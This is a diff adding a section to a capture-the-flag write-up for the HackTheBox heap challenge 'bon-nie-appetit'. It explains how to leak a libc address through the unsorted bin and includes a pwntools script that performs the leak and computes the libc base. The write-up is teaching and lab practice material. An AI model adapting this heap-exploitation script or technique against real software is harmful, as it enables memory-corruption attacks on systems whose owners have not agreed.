@@ -77,3 +77,95 @@ size into account. (we can creating a fake size field).
 10. Let's leak a libc first by allocate size outside of fastbin range. When the chunk freed, it shall resides at the unsorted bin.
 11. To make sure our chunk falls at unsortedbin, let's allocate size in range of largebins.
 
+### LEAK LIBC ADDRESS IN UNSORTED BIN
+
+- To be able for libc address disclosed at the unsorted bins we need to allocate sizes outside the fastbin ranges.
+- The simplest method to make sure the chunks are stored in unsorted bins after freed, simply allocate sizes of largebins.
+- BUT remember to allocate another chunk after it to prevent consolidation with the top chunk.
+
+> FLOW
+
+```
+allocate 0x428 (so the size field is 0x430)
+allocate 24 (just to prevent consolidation with the top chunk)
+free index 0 (at this phase, libc is shown at the unsorted bins)
+free index 1
+allocate 0x428
+show contents at index 0
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e25ce249-262d-4a0d-8da5-9f8e2de2d456)
+
+
+12. Great! Now let's unpack and calculate the libc base using **vmmap**.
+
+> SCRIPT
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+exe = './bon-nie-appetit'
+elf = context.binary = ELF(exe, checksec=True)
+# context.log_level = 'DEBUG'
+context.log_level = 'INFO'
+
+library = './glibc/libc.so.6'
+libc = context.binary = ELF(library, checksec=False)
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+def make(size, data):
+    sh.sendlineafter(b'>', b'1')
+    sh.sendlineafter(b':', str(size))
+    sh.sendlineafter(b':', data)
+
+def show(index):
+    sh.sendlineafter(b'>', b'2')
+    sh.sendlineafter(b':', str(index))
+
+def edit(index, data):
+    sh.sendlineafter(b'>', b'3')
+    sh.sendlineafter(b':', str(index))
+    sh.sendlineafter(b':', data)
+
+def delete(index):
+    sh.sendlineafter(b'>', b'4')
+    sh.sendlineafter(b':', str(index))
+
+def finalize():
+    sh.sendlineafter(b'>', b'5') 
+
+sh = start()
+
+# leak libc
+make(0x428, b'A') # size field 0x430
+make(24, b'B') 
+delete(0) # delete chunk idx 0
+delete(1) # delete chunk idx 1
+make(0x428, b'') 
+show(0)
+
+sh.recvuntil(b"=> ")
+get = unpack(sh.recv(6) + b'\x00' * 2)
+log.info(f'libc leak --> {hex(get)}')
+
+libc.address = get - 4111370
+success(f'LIBC BASE --> {hex(libc.address)}')
+
+gdb.attach(sh)
+sh.interactive()
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fda5a6fd-8953-4acf-a143-eb21162bfe8e)
+
